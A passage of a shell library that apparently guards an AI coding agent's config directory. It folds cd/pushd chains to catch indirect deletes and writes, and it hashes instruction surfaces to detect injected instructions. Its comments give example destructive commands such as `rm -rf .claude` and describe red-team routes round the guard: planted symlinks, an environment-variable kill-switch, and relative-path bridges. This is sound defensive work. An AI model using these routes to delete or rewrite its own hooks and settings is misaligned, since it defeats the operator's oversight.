          if (ar[j] ~ /^-[LPen@]+$/) continue
          t = ar[j]; got = 1; break
        }
        # Bare `cd` is $HOME; bare `pushd` swaps the stack, and `+N`/`-N` rotate
        # it — both land somewhere only the shell knows.
        if (!got)                                cwd = (w == "cd") ? home : ""
        else if (t == "-" || t ~ /^[-+][0-9]+$/) cwd = ""
        else                                     cwd = resolve(t, cwd)
        # STICKY: once the command has stood in the config dir, every later segment is judged as if it still does; stepping out with `cd ..` is not evidence of innocence.
        if (cwd != "" && inside(cwd)) exit 0
      }
      exit 1
    }'
}

# floor_seg_operand_under <verb-ERE> <dir> [<dir> ...] - exit 0 iff, after folding the same cd/pushd chain, some segment whose command matches <verb-ERE> carries an OPERAND that resolves to at-or-below one of <dir>.
# The sibling question, and the one the CD-BRIDGE asks (edge pass 2026-08-29): floor_seg_cwd_under asks whether the command is STANDING in the config dir; here it stands NEXT TO it and reaches in by a relative name (`cd ~ && rm -rf .claude`, `pushd ~ && ...`, `(cd ~ && ...)`, `.cl*aude`), which no path rule could see (admission-baseline.md P12-argv-01).
# THE ANCHOR IS REQUIRED, which keeps this off ordinary work: `cwd` starts EMPTY and resolve() returns empty for a relative operand with no anchor before it, so a bare rm -rf .claude in an unknown directory is untouched. `cd ~ && rm -rf .cache` stays allowed (component comparison).
# UNKNOWN IS STILL NOT "INSIDE": a substitution, glob or variable in the cd target or operand resolves to empty and matches nothing (fail-open like its sibling; the flat rules stay alongside).
floor_seg_operand_under() { # [--dest-only] <verb-ERE> <dir> [<dir> …]
  # --dest-only JUDGES THE LAST OPERAND AND NOTHING ELSE, which makes this usable for `cp`: `cp <cfg>/x /tmp/backup` is a READ and must stay allowed, `cp /tmp/evil <cfg>/settings.json` is the write (P12-argv-fp-01/02/03). One flag, not a sibling function: a second copy of the cd-chain fold is the drift docs/explanation/modularity.md is about.
  [ -n "${FLOOR_SEGS:-}" ] || return 1
  _soum=any
  if [ "${1:-}" = "--dest-only" ]; then _soum=last; shift; fi
  [ "$#" -gt 1 ] || return 1
  case "$FLOOR_SEGS" in *cd*|*pushd*) ;; *) return 1 ;; esac
  _souv="$1"; shift
  # Verb and directories arrive as INPUT LINES for the same reason the sibling
  # gives: awk runs escape processing over a -v value.
  { printf 'MODE:%s\n' "$_soum"; printf 'VERB:%s\n' "$_souv"; printf 'CFGD:%s\n' "$@"; printf '%s\n' "$FLOOR_SEGS"; } | awk -v home="$HOME" '
    function norm(p,   n, i, a, out, k, lead, r) {
      lead = (substr(p, 1, 1) == "/")
      n = split(p, a, "/"); k = 0
      for (i = 1; i <= n; i++) {
        if (a[i] == "" || a[i] == ".") continue
        if (a[i] == "..") { if (k > 0) k--; continue }
        out[++k] = a[i]
      }
      r = ""
      for (i = 1; i <= k; i++) r = r ((i == 1 && !lead) ? "" : "/") out[i]
      if (r == "") r = lead ? "/" : ""
      return r
    }
    function resolve(t, c) {
      if (t == "~" || t == "$HOME" || t == "${HOME}") return home
      if (substr(t, 1, 2)  == "~/")       return norm(home substr(t, 2))
      if (substr(t, 1, 6)  == "$HOME/")   return norm(home substr(t, 6))
      if (substr(t, 1, 8)  == "${HOME}/") return norm(home substr(t, 8))
      if (substr(t, 1, 1)  == "/")        return norm(t)
      if (t ~ /^~[A-Za-z_][A-Za-z0-9_.-]*(\/|$)/) return norm(t)
      if (index(t, "@SUB@") || index(t, "$") || index(t, "`") || t ~ /[*?]/) return ""
      if (c == "") return ""
      return norm(c "/" t)
    }
    # A LEADING `=` MEANS EXACT, ANYTHING ELSE AT-OR-BELOW: matching the config dir as a SUBTREE blocked `cd ~/.claude/MEMORY && rm stale-note.md` (S7, guarded since pass 7). The config dir is deliberately WRITABLE (B8); what is protected is the dir ITSELF and its teeth, so the dir is passed exact and bin/ and hooks/ as subtrees.
    # A LEADING `%` MEANS MATCH THIS ERE: it names a PINNED FILE inside a writable directory (EDGE-cdbridge-01: `cd ~ && rm .claude/settings.json` exited 0) without widening to a subtree, which would cost S7.
    # NO APOSTROPHES IN THIS AWK PROGRAM, comments included: it is one single-quoted shell word, so one apostrophe ends it early (harbor#299). `sh -n` catches it; nothing else does.
    # The pattern arrives on an INPUT LINE, so awk does no escape processing and a `\.` stays a literal dot.
    function inside(p,   i, d) {
      if (p == "") return 0
      for (i = 1; i <= nd; i++) {
        d = D[i]
        if (substr(d, 1, 1) == "=") { if (p == substr(d, 2)) return 1; continue }
        if (substr(d, 1, 1) == "%") { if (p ~ substr(d, 2)) return 1; continue }
        if (p == d || index(p, d "/") == 1) return 1
      }
      return 0
    }
    /^MODE:/ { mode = substr($0, 6); next }
    /^VERB:/ { verb = substr($0, 6); next }
    /^CFGD:/ { d = substr($0, 6)
               # Trailing slashes are noise on a DIRECTORY and meaningful inside
               # a pattern, so only directories are stripped.
               if (substr(d, 1, 1) != "%") sub(/\/+$/, "", d)
               if (d != "") D[++nd] = d; next }
    /^SEGC:/ { n = $0; sub(/^SEGC:/, "", n); sub(/:.*/, "", n)
               v = $0; sub(/^SEGC:[0-9]+:/, "", v)
               C[n + 0] = v; if (n + 0 > MAX) MAX = n + 0; next }
    /^SEGA:/ { n = $0; sub(/^SEGA:/, "", n); sub(/:.*/, "", n)
               v = $0; sub(/^SEGA:[0-9]+:/, "", v)
               A[n + 0] = A[n + 0] "\n" v; if (n + 0 > MAX) MAX = n + 0; next }
    END {
      if (nd == 0 || verb == "") exit 1
      cwd = ""
      for (k = 1; k <= MAX; k++) {
        w = C[k]; if (w == "") continue
        base = w; sub(/.*\//, "", base)
        if (base == "popd") { cwd = ""; continue }
        if (base == "cd" || base == "pushd") {
          t = ""; got = 0
          m = split(A[k], ar, "\n")
          for (j = 1; j <= m; j++) {
            if (ar[j] == "" || ar[j] == "--") continue
            if (ar[j] ~ /^-[LPen@]+$/) continue
            t = ar[j]; got = 1; break
          }
          if (!got)                                cwd = (base == "cd") ? home : ""
          else if (t == "-" || t ~ /^[-+][0-9]+$/) cwd = ""
          else                                     cwd = resolve(t, cwd)
          continue
        }
        # A MUTATING SEGMENT. Its operands are judged where the command is
        # standing NOW — the fold above has already run for every earlier hop.
        if (w !~ verb) continue
        m = split(A[k], ar, "\n")
        # In last mode only the FINAL operand is judged. Collected first so a
        # trailing flag cannot be mistaken for the destination.
        last = ""
        for (j = 1; j <= m; j++) {
          if (ar[j] == "" || ar[j] == "--") continue
          # Flags are not operands. "rm -rf" must not resolve `-rf` as a name.
          if (substr(ar[j], 1, 1) == "-") continue
          if (mode == "last") { last = ar[j]; continue }
          if (inside(resolve(ar[j], cwd))) exit 0
        }
        if (mode == "last" && last != "" && inside(resolve(last, cwd))) exit 0
      }
      exit 1
    }'
}

# floor_seg_cd_fold <dir>… [+<subtree>…] — harbor#776. Each segment whose RELATIVE operand or redirect
# target lands at or below <dir> after the cd/pushd chain, re-spelled with it resolved: a
# `FOLD:<flat line>` plus SEGC/SEGA/SEGR rows under a fresh id, for guard-bash to append.
# Standing INSIDE <dir> stays the cd-cfg rules' (harbor#280/#289); from there only a +<subtree> folds.
# STICKY: every dir the command stood in stays a candidate, since the table carries no subshell
# structure (`(cd /tmp)`, `$(cd /tmp)`, a pipeline, a sibling `bash -c` would launder the fold).
# UNRESOLVABLE IS NOT SAFE: after `cd -`, popd, a substitution, an untracked variable, a glob, a
# climb out of the unknown session cwd or a 65th dir, a target that reaches <dir> from one of its
# ancestors (`.claude/…`, `<user>/.claude/…`, `../` first) is folded onto <dir>.
floor_seg_cd_fold() { # <dir>… [+<subtree>…] -> FOLD: lines and SEG rows
  [ -n "${FLOOR_SEGS:-}" ] || return 0
  [ "$#" -gt 0 ] || return 0
  case "$FLOOR_SEGS" in *cd*|*pushd*|*popd*) ;; *) return 0 ;; esac
  { printf 'CFGD:%s\n' "$@"; printf '%s\n' "$FLOOR_SEGS"; } | awk -v home="$HOME" '
    # NO APOSTROPHES in this program: it is one single-quoted shell word (harbor#299).
    function norm(p,   n, i, a, out, k, lead, r) {
      lead = (substr(p, 1, 1) == "/")
      n = split(p, a, "/"); k = 0
      for (i = 1; i <= n; i++) {
        if (a[i] == "" || a[i] == ".") continue
        if (a[i] == "..") { if (k > 0) k--; continue }
        out[++k] = a[i]
      }
      r = ""
      for (i = 1; i <= k; i++) r = r ((i == 1 && !lead) ? "" : "/") out[i]
      if (r == "") r = lead ? "/" : ""
      return r
    }
    function climbs(p,   n, i, a, d) {
      n = split(p, a, "/"); d = 0
      for (i = 1; i <= n; i++) {
        if (a[i] == "" || a[i] == ".") continue
        if (a[i] == "..") { if (--d < 0) return 1; continue }
        d++
      }
      return 0
    }
    function inD(p, ci,   i, q, d) {
      q = ci ? tolower(p) : p
      for (i = 1; i <= nd; i++) { d = ci ? LD[i] : D[i]; if (q == d || index(q, d "/") == 1) return 1 }
      return (q ~ /^~[A-Za-z_][A-Za-z0-9_.-]*\/\.claude(\/|$)/)
    }
    function inS(p,   i, q) { q = tolower(p); for (i = 1; i <= nsd; i++) if (q == LSD[i] || index(q, LSD[i] "/") == 1) return 1; return 0 }
    # Landing folds case, as APFS and the flat rules do; the cwd handed to the cd-cfg rules is theirs only
    # when THEIR case-strict fold would see it, so `cd ~ && cd .CLAUDE` still folds here.
    function lands(c, r) { return inS(r) || (inD(r, 1) && !(inD(c, 0) && !inS(c))) }
    # An ancestor of <dir> or a dir below it: the only candidates a non-climbing target can use.
    function near(p,   i, q) {
      if (p == "/" || substr(p, 1, 1) == "~") return 1
      q = tolower(p)
      for (i = 1; i <= nd; i++) if (index(LD[i] "/", q "/") == 1 || index(q, LD[i] "/") == 1) return 1
      for (i = 1; i <= nsd; i++) if (index(LSD[i] "/", q "/") == 1 || index(q, LSD[i] "/") == 1) return 1
      return 0
    }
    function addc(p) {
      if (p == "" || (p in HAS)) return
      if (nc >= 64) { dirty = 1; return }
      HAS[p] = 1; CL[++nc] = p; NEAR[nc] = near(p)
    }
    function addvar(a,   n) { n = a; sub(/=.*/, "", n); VN[n]++; V[n, VN[n]] = substr(a, length(n) + 2) }
    # A reassigned HOME makes every home spelling a guess, so it dirties the fold as well.
    function cdto(t, depth,   i, m, name, rest) {
      if (t == "~" || t == "$HOME" || t == "${HOME}") { addc(home); if (homeset) dirty = 1; return }
      if (substr(t, 1, 2) == "~/")       { addc(norm(home substr(t, 2))); if (homeset) dirty = 1; return }
      if (substr(t, 1, 6) == "$HOME/")   { addc(norm(home substr(t, 6))); if (homeset) dirty = 1; return }
      if (substr(t, 1, 8) == "${HOME}/") { addc(norm(home substr(t, 8))); if (homeset) dirty = 1; return }
      if (depth == 0 && match(t, /^[$]([{][A-Za-z_][A-Za-z0-9_]*[}]|[A-Za-z_][A-Za-z0-9_]*)/)) {
        name = substr(t, 2, RLENGTH - 1); gsub(/[{}]/, "", name); rest = substr(t, RLENGTH + 1)
        if ((rest != "" && substr(rest, 1, 1) != "/") || !(name in VN)) { dirty = 1; return }
        for (i = 1; i <= VN[name]; i++) cdto(V[name, i] rest, 1)
        return
      }
      if (t ~ /[$`*?[]/ || index(t, "@SUB@") || index(t, "@PSUB@")) { dirty = 1; return }
      if (substr(t, 1, 1) == "/" || t ~ /^~[A-Za-z_][A-Za-z0-9_.-]*(\/|$)/) { addc(norm(t)); return }
      if (substr(t, 1, 1) == "~") { dirty = 1; return }
      if (climbs(t)) dirty = 1
      m = nc
      for (i = 1; i <= m; i++) addc(norm(CL[i] "/" t))
    }
    # The resolved spelling of one operand, or "" when it does not land at or below <dir>.
    function tokfold(t, op,   pre, p, i, r, s, cl, c1, q) {
      if (op == "<<" || op == "<<<") return ""
      pre = ""; p = t
      if (substr(p, 1, 1) == "-") {
        i = index(p, "="); if (!i) return ""
        pre = substr(p, 1, i); p = substr(p, i + 1)
      } else if (match(p, /^[A-Za-z_][A-Za-z0-9_]*=/)) {
        pre = substr(p, 1, RLENGTH); p = substr(p, RLENGTH + 1)
      }
      if (p == "" || p == "-" || p ~ /[[:space:]]/) return ""
      c1 = substr(p, 1, 1)
      if (c1 == "/" || c1 == "~" || c1 == "&" || c1 == "$" || c1 == "@" || c1 == "`") return ""
      # A later unknown component is one word only when no `..` can climb back over it.
      if ((p ~ /[$`]/ || index(p, "@SUB@") || index(p, "@PSUB@")) && p ~ /(^|\/)\.\.(\/|$)/) return ""
      cl = climbs(p)
      for (i = 1; i <= nc && work < 8000; i++) {
        if (!cl && !NEAR[i]) continue
        work++; r = norm(CL[i] "/" p)
        if (lands(CL[i], r)) return pre r
      }
      if (work >= 8000) dirty = 1   # a budget that runs out fails CLOSED, into the dirty arm
      if (dirty) {
        s = norm(p); q = tolower(s)
        for (i = 1; i <= ns; i++) if (q == LSS[i] || index(q, LSS[i] "/") == 1) return pre norm(SA[i] "/" s)
      }
      return ""
    }
    function flat(s,   x) { x = s; gsub(/[[:space:];&|<>()`]/, "_", x); return x }
    /^CFGD:/ { d = substr($0, 6); sub(/\/+$/, "", d); if (d == "") d = "/"
               if (substr(d, 1, 1) == "+") { SD[++nsd] = substr(d, 2); LSD[nsd] = tolower(SD[nsd]) }
               else { D[++nd] = d; LD[nd] = tolower(d) }
               next }
    /^SEG[CWAR]:/ {
      tg = substr($0, 4, 1); s = substr($0, 6); id = s; sub(/:.*/, "", id); id = id + 0
      v = s; sub(/^[0-9]+:/, "", v)
      if (id > MAX) MAX = id
      if (v ~ /^HOME=/) homeset = 1
      if (tg == "C") C[id] = v
      else if (tg == "W") W[id] = v
      else if (tg == "A") A[id, ++AN[id]] = v
      # RX, never RT: gawk reserves RT and dies on it as an array (harbor#865)
      else { o = v; sub(/:.*/, "", o); t = v; sub(/^[^:]*:/, "", t); RO[id, ++RN[id]] = o; RX[id, RN[id]] = t }
      next
    }
    END {
      if (nd == 0) exit 0
      home = norm(home)
      for (i = 1; i <= nd; i++) {
        if (substr(D[i], 1, 1) != "/") continue
        n = split(D[i], P, "/")
        for (j = 2; j <= n; j++) {
          a = ""; for (q = 2; q < j; q++) a = a "/" P[q]
          if (a == "") a = "/"
          sfx = P[j]; for (q = j + 1; q <= n; q++) sfx = sfx "/" P[q]
          if (sfx != "") { SA[++ns] = a; SS[ns] = sfx; LSS[ns] = tolower(sfx) }
        }
      }
      for (k = 1; k <= MAX; k++) {
        b = C[k]; sub(/.*\//, "", b)
        if (C[k] == "" && W[k] ~ /^[A-Za-z_][A-Za-z0-9_]*=/) addvar(W[k])
        else if (b ~ /^(export|declare|typeset|local|readonly)$/)
          for (j = 1; j <= AN[k]; j++) if (A[k, j] ~ /^[A-Za-z_][A-Za-z0-9_]*=/) addvar(A[k, j])
      }
      for (k = 1; k <= MAX; k++) {
        w = C[k]; b = w; sub(/.*\//, "", b)
        if (b == "popd") { dirty = 1; continue }
        if (b == "cd" || b == "pushd") {
          tt = ""; got = 0
          for (j = 1; j <= AN[k]; j++) {
            if (A[k, j] == "--" || A[k, j] ~ /^-[LPenqs@]+$/) continue
            tt = A[k, j]; got = 1; break
          }
          if (!got) { if (b == "cd") cdto("~", 0); else dirty = 1 }
          else if (tt == "-" || tt ~ /^[-+][0-9]+$/) dirty = 1
          else cdto(tt, 0)
          continue
        }
        if (nc == 0 && !dirty) continue
        if (w == "" && !RN[k]) continue
        hit = 0
        for (j = 1; j <= AN[k]; j++) { r = tokfold(A[k, j], ""); NA[j] = (r != "") ? r : A[k, j]; if (r != "") hit = 1 }
        for (j = 1; j <= RN[k]; j++) { r = tokfold(RX[k, j], RO[k, j]); NT[j] = (r != "") ? r : RX[k, j]; if (r != "") hit = 1 }
        if (!hit) continue
        id = MAX + (++out)
        line = (w != "") ? flat(w) : ""
        for (j = 1; j <= AN[k]; j++) line = line " " flat(NA[j])
        for (j = 1; j <= RN[k]; j++) if (RO[k, j] != "<<" && RO[k, j] != "<<<") line = line " " RO[k, j] " " flat(NT[j])
        print "FOLD:" line
        if (w != "") print "SEGC:" id ":" w
        for (j = 1; j <= AN[k]; j++) print "SEGA:" id ":" NA[j]
        for (j = 1; j <= RN[k]; j++) print "SEGR:" id ":" RO[k, j] ":" NT[j]
      }
    }' 2>/dev/null
}

# B8 (harbor#38) - the PERSISTENT INSTRUCTION surfaces. ~/.claude/CLAUDE.md and the agents/skills/commands trees are loaded into every FUTURE session, so writing to them is capability injection with a session's delay. They stay WRITABLE by design, but a change is pinned here and reported at the next SessionStart, when injected instructions would first load.
# NOT settable from the environment: an emptied FLOOR_INSTR_SURFACES made the whole check a silent no-op, the kill-switch class of FLOOR_AWK/FLOOR_GREP (privsec FO-03/04/05, B8-04); a project settings.json `env` block could set it.
# `hooks` and `plugins` are here as well as under B2/B6: plugins ship hooks and skills, both loaded.
# `projects/*/memory` is the auto-memory injected into every session; it was once pulled for noise and the assumption was measured wrong (red-team B8-NOISE-06: 3 of 16 transcripts touched it).
# `inject.d` (harbor#173) is an instruction surface: a rule pack's body is injected verbatim at the moment of a tool call (docs/reports/evals.md E6, E10), so an unreviewed edit matters MORE than one to CLAUDE.md. `context-rules` is the same surface after harbor#1010; inject.d stays while the engine reads it.
FLOOR_INSTR_SURFACES='CLAUDE.md CLAUDE.local.md agents skills commands output-styles hooks plugins context-rules inject.d projects/*/memory'

# floor_sha — one sha256, whichever tool this box has.
floor_sha() { if command -v sha256sum >/dev/null 2>&1; then sha256sum; else shasum -a 256; fi | awk '{print $1}'; }

# floor_pluginmeta_sha <json-file> - hash a TIMESTAMP-STRIPPED canonical form of a plugin manifest (harbor#198). The plugin system rewrites `lastUpdated`/`installedAt` every session, so raw bytes made B8 report drift at EVERY SessionStart. The plugin set, gitCommitSha and installPath stay hashed; only the clock is ignored. jq missing or unparsable: hash the RAW bytes (fail toward more coverage).
# `|| true` INSIDE THE SUBSTITUTION IS LOAD-BEARING: the pinner runs under `set -eu` (pin-instructions.sh), and without it a manifest jq cannot parse aborted the function and emitted an EMPTY hash with the path intact, so the file looked watched while any edit was invisible (floor-test 9h).
floor_pluginmeta_sha() { # <json-file>
  if command -v jq >/dev/null 2>&1; then
    _pmn="$(jq -S 'walk(if type=="object" then del(.lastUpdated, .installedAt) else . end)' "$1" 2>/dev/null || true)"
    if [ -n "$_pmn" ]; then printf '%s' "$_pmn" | floor_sha; return; fi
  fi
  floor_sha < "$1"
}

# floor_syncmeta_sha <json-file> — hash plugins/synced/<id>/.marketplaces.json without `etag` and each
# row's `updated_at`: the account sync rewrites both about hourly with the list unchanged, which kept B8
# amber at every SessionStart. Name, source, scope and id stay hashed, so a new marketplace is drift.
floor_syncmeta_sha() { # <json-file>
  if command -v jq >/dev/null 2>&1; then
    _smn="$(jq -S 'del(.etag) | (.rows | arrays) |= map((. | objects) |= del(.updated_at))' "$1" 2>/dev/null || true)"
    if [ -n "$_smn" ]; then printf '%s' "$_smn" | floor_sha; return; fi
  fi
  floor_sha < "$1"
}

# floor_marketplace_sha <json-file> - hash a marketplace CATALOG with the per-entry `source.sha` stripped. Same failure as harbor#198 with a field that is not a clock: upstream bumps `.plugins[].source.sha` many times a day, so the pin went red several times a day over a vendor catalog the operator cannot diff.
# Not a weakened gate: `url`, `path` and `ref` STAY hashed (repointing an entry is the supply-chain attack and still reads as drift); everything INSTALLED keeps its own pinned gitCommitSha (floor_pluginmeta_sha); and a catalog sha is a FORECAST, not a load, since the fetched plugin's files land under `plugins/` and are hashed file by file. The file is RE-EMITTED, so an entry added, removed or repointed is still drift.
# jq missing or unparsable: hash the RAW bytes; the `|| true` makes that reachable under the pinner's `set -eu` (see floor_pluginmeta_sha).
floor_marketplace_sha() { # <json-file>
  if command -v jq >/dev/null 2>&1; then
    _mkn="$(jq -S '(.plugins | arrays) |= map((.source | objects) |= del(.sha))' "$1" 2>/dev/null || true)"
    if [ -n "$_mkn" ]; then printf '%s' "$_mkn" | floor_sha; return; fi
  fi
  floor_sha < "$1"
}

# ── the plugins the harness LOADS (harbor#478) ──────────────────────────────
# A daily byte-identical re-extraction moved cache/<ver>/ and drifted B8, so cache/ is pinned
# per ENTRY of installed_plugins.json, by content; a version dir no entry names loads nothing.
#
# floor_plugins_loaded <json> — "key TAB scope TAB project TAB dir" per entry, `-` when absent
# (tab is IFS whitespace). A shape it cannot read exactly gives a `-` dir: the full walk.
floor_plugins_loaded() {
  jq -r 'if (.plugins | type) != "object" or any(.plugins[]; type != "array" or any(.[]; type != "object"))
         then "?\t-\t-\t-" else
           .plugins | to_entries[] | .key as $k | .value[]
           | [$k, (.scope // "user"), (.projectPath // "-"), (.installPath // "-")] | map(tostring)
           | if any(.[]; . == "" or test("[\t\n\r\\\\]")) then ["?", "-", "-", "-"] else . end | @tsv
         end' "$1" 2>/dev/null || true
}
# floor_installed_sha <installed_plugins.json> — floor_pluginmeta_sha's form, minus the three
# fields a re-extraction rewrites. Only used while the loaded dirs are hashed by content.
floor_installed_sha() {
  _isn="$(jq -S 'walk(if type=="object" then del(.lastUpdated, .installedAt) else . end)
                 | (.plugins | objects) |= map_values(if type=="array"
                     then map(if type=="object" then del(.installPath, .version, .gitCommitSha) else . end)
                     else . end)' "$1" 2>/dev/null || true)"
  if [ -n "$_isn" ]; then printf '%s' "$_isn" | floor_sha; else floor_pluginmeta_sha "$1"; fi
}
# What a marketplace holds that nothing can load (harbor#1390): a checkout carries every plugin it lists, but the harness loads only those a settings file enables or installed_plugins.json installs. Upstream edits to a plugin nobody enabled, and the directory's own catalog cache, turned B8 amber at every SessionStart and cannot carry an instruction, so:
#   D <prefix>      plugins/marketplaces/<mp>/<plugins|external_plugins>/<dir>/ of a plugin no name below can load
#   R <path> <sha>  plugins/plugin-directory-cache-v2.json hashed over the listings of loadable plugins only, clock-free
# The names: every installed_plugins.json key and every enabledPlugins key not set to false in this config dir's settings.json and settings.local.json, compared without the @<marketplace>. A dir is kept when its name is one of them or a kept catalog entry's string source points in or under it. FAIL TOWARD COVERAGE: no jq, an unreadable installed_plugins.json, an unparsable settings file or catalog, or a name with a tab, newline or backslash, and nothing is dropped.
floor_plugins_unloaded() { # <config-dir>
  _pu="$1/plugins"
  command -v jq >/dev/null 2>&1 || return 0
  [ -f "$_pu/installed_plugins.json" ] || return 0
  case "$_pu" in *[][*?]*) return 0 ;; esac
  _pul="$(floor_plugins_loaded "$_pu/installed_plugins.json")"
  [ -n "$_pul" ] || return 0
  if printf '%s\n' "$_pul" | awk -F'\t' '$4 == "-" || seen[$1 FS $2 FS $3]++ { f = 1 } END { exit !f }'; then return 0; fi
  _pun="$(printf '%s\n' "$_pul" | awk -F'\t' '{ print $1 }')"
  for _ps in "$1/settings.json" "$1/settings.local.json"; do
    [ -e "$_ps" ] || continue
    _pse="$(jq -r '(.enabledPlugins // {}) | if type == "object" then (to_entries[] | select(.value != false) | .key)
                   else error("shape") end' "$_ps" 2>/dev/null)" || return 0
    _pun="$_pun
$_pse"
  done
  _punj="$(printf '%s\n' "$_pun" | jq -R -s -c 'split("\n") | map(select(length > 0) | sub("@[^@]*$"; "") | ascii_downcase) | unique' 2>/dev/null)" || return 0
  [ -n "$_punj" ] || return 0
  for _pm in "$_pu"/marketplaces/*; do
    { [ -d "$_pm" ] && [ ! -L "$_pm" ] && [ -f "$_pm/.claude-plugin/marketplace.json" ]; } || continue
    _pmn="${_pm##*/}"
    case "$_pmn" in *'	'*|*\\*) continue ;; esac
    _pk="$(jq -r --argjson n "$_punj" '
      ($n | map("plugins/" + ., "external_plugins/" + .))
      + [ (.plugins // []) | arrays | .[] | objects | select(((.name // "") | tostring | ascii_downcase) as $x | any($n[]; . == $x))
          | .source | strings | sub("^(\\./)+"; "") | sub("/+$"; "") ]
      | .[]' "$_pm/.claude-plugin/marketplace.json" 2>/dev/null)" || continue
    for _pt in plugins external_plugins; do
      { [ -d "$_pm/$_pt" ] && [ ! -L "$_pm/$_pt" ]; } || continue
      find "$_pm/$_pt" -mindepth 1 -maxdepth 1 -type d 2>/dev/null | while IFS= read -r _pdd; do
        _pdn="${_pdd##*/}"
        case "$_pdn" in *'	'*|*\\*) continue ;; esac
        printf '%s/%s\n' "$_pt" "$_pdn"
      done
    done | _PU_KEPT="$_pk" _PU_MP="$_pmn" awk '
      BEGIN { n = split(ENVIRON["_PU_KEPT"], k, "\n") }
      { r = $0; keep = 0
        for (i = 1; i <= n; i++) if (k[i] != "" && (k[i] == r || index(k[i], r "/") == 1 || index(r, k[i] "/") == 1)) { keep = 1; break }
        if (!keep) printf "D\tplugins/marketplaces/%s/%s/\n", ENVIRON["_PU_MP"], r }'
  done
  _pdc="$_pu/plugin-directory-cache-v2.json"
  if [ -f "$_pdc" ] && [ ! -L "$_pdc" ]; then
    _pdp="$(jq -S -c --argjson n "$_punj" '
      (.entryNames // {}) as $en
      | (.listings | arrays) |= map(select(type != "object"
          or ((($en[(.id // "") | tostring] // "") | tostring | ascii_downcase) as $a
              | ((.name // "") | tostring | ascii_downcase) as $b | any($n[]; . == $a or . == $b))))
      | ([.listings[]? | objects | (.id // "") | tostring]) as $ids
      | del(.fetchedAt)
      | (.entryNames | objects) |= with_entries(select(.key as $i | any($ids[]; . == $i)))
      | (.entryNameClaims | objects) |= (with_entries(select(.key as $i | any($ids[]; . == $i)))
                                         | map_values(if type == "object" then del(.lastSeen) else . end))' "$_pdc" 2>/dev/null || true)"
    [ -z "$_pdp" ] || printf 'R\tplugins/plugin-directory-cache-v2.json\t%s\n' "$(printf '%s' "$_pdp" | floor_sha)"
  fi
  return 0
}
# floor_instr_unloaded_filter — the manifest on stdin minus what floor_plugins_unloaded drops, with its
# replacements applied. Literal compares only: the config dir and the names are data.
floor_instr_unloaded_filter() { # <floor_plugins_unloaded output>
  _IM_UNL="${1:-}" awk 'BEGIN { n = split(ENVIRON["_IM_UNL"], u, "\n")
               for (i = 1; i <= n; i++) { split(u[i], f, "\t"); if (f[1] == "D") d[f[2]] = 1; else if (f[1] == "R") r[f[2]] = f[3] } }
    { s = index($0, "  "); p = s ? substr($0, s + 2) : ""
      if (p ~ /^plugins\/marketplaces\//) { m = split(p, a, "/"); if (m >= 6 && ((a[1] "/" a[2] "/" a[3] "/" a[4] "/" a[5] "/") in d)) next }
      if ((p in r) && substr($0, 1, s - 1) ~ /^[0-9a-f]+$/) { print r[p] "  " p; next }
      print }'
}

# floor_instr_tree <dir> <label> — "<sha>  <label>/<rel>" per file under <dir>, and every
# symlink's target, with the harness's own bookkeeping pruned as in the walk below.
floor_instr_tree() {
  _itd="${1%/}"
  if command -v sha256sum >/dev/null 2>&1; then _ith=sha256sum; else _ith='shasum -a 256'; fi
  # -H: a symlinked installPath is walked through, and its target is recorded too.
  if [ -L "$_itd" ]; then printf 'link:%s  %s\n' "$(readlink "$_itd" 2>/dev/null || echo '?')" "$2"; fi
  # shellcheck disable=SC2086
  find -H "$_itd" \( -name .git -o -name .in_use \) -prune -o \
       ! -name .orphaned_at ! -name .last-complete-round ! -name .gcs-sha \
       -type f -exec $_ith {} + 2>/dev/null \
    | awk -v p="  $_itd/" -v l="  $2/" '{ i = index($0, p); if (i) print substr($0, 1, i - 1) l substr($0, i + length(p)) }'
  find -H "$_itd" \( -name .git -o -name .in_use \) -prune -o -type l -print 2>/dev/null | while IFS= read -r _itl; do
    _itr="$2/${_itl#"$_itd"/}"
    printf 'link:%s  %s\n' "$(readlink "$_itl" 2>/dev/null || echo '?')" "$_itr"
    if [ -f "$_itl" ]; then printf '%s  %s\n' "$(floor_sha < "$_itl")" "$_itr"; fi
  done
  return 0
}

# floor_instr_diff <pin> — the manifest on stdin against the pin file: "< line" pinned only, "> line" now only,
# sorted; nothing when they match. Not `diff - <pin>`: macOS diff opens `-` by name, which the confinement refuses
# (harbor#555), and the error read as drift naming no path. No temp file: a dry run and --check write nothing.
floor_instr_diff() {
  awk -v pin="$1" 'BEGIN { while ((getline l < pin) > 0) p[l] = 1 }
    { n[$0] = 1 } END { for (k in p) if (!(k in n)) print "< " k; for (k in n) if (!(k in p)) print "> " k }' | sort
}

# floor_instr_manifest <config-dir> - "<sha>  <relative-path>" per file, sorted. ONE implementation shared by the pinner and the gate: two hashers that agree by coincidence would report drift on every session or on none. `-exec ... +` batches the hashing (597 skill files: 9.4s one spawn at a time, 0.14s batched); a nine-second SessionStart hook is one the operator disables.
# SYMLINKS ARE THE WHOLE GAME HERE: a plain `find -type f` does not match a symlink, so a planted link was invisible and a symlinked top-level CLAUDE.md recorded as "absent" (red-team B8-02, B8-03). Two things are recorded for every tree: the CONTENT reached by following links, and the LINK TARGETS themselves, so re-pointing a link is drift even when the new target is byte-identical.
# True when a projects/<x>/memory link only points at another projects/<y>/memory of the same config dir that
# is a real directory: absolute, no `..`, one level, so the walk pins its content under its own path anyway.
floor_instr_shared_memory() { # <config-dir> <surface glob> <link target>
  [ "$2" = 'projects/*/memory' ] || return 1
  case "$3" in "$1"/projects/*/memory) ;; *) return 1 ;; esac
  case "$3" in *..*|*//*) return 1 ;; esac
  _ism="${3#"$1"/projects/}"; _ism="${_ism%/memory}"
  case "$_ism" in ''|*/*) return 1 ;; esac
  [ -d "$3" ] && [ ! -L "$3" ]
}
# floor_instr_memlinks <config-dir> — the projects/*/memory links that are NOT exempt (floor_instr_shared_memory),
# decided from ONE readlink over one snapshot of the links, not a fork per link (1,298 links cost ~10 s at load 24,
# harbor#559). Prints `ok` and then those links. Any doubt — a failed readlink, or a target with a newline in it —
# prints nothing, and every link is then decided one by one as before.
floor_instr_memlinks() { # <config-dir>
  # Numbered variables, then one `set --`: appending with `set -- "$@" x` per link is quadratic (6.7 s user).
  _iml_c="$1"; _iml_n=0; _iml_r=''
  for _iml_p in "$_iml_c"/projects/*/memory; do
    [ -L "$_iml_p" ] || continue
    _iml_n=$((_iml_n + 1)); eval "_iml_p$_iml_n=\$_iml_p"; _iml_r="$_iml_r \"\$_iml_p$_iml_n\""
  done
  eval "set -- $_iml_r"
  [ $# -gt 0 ] || { printf 'ok\n'; return 0; }
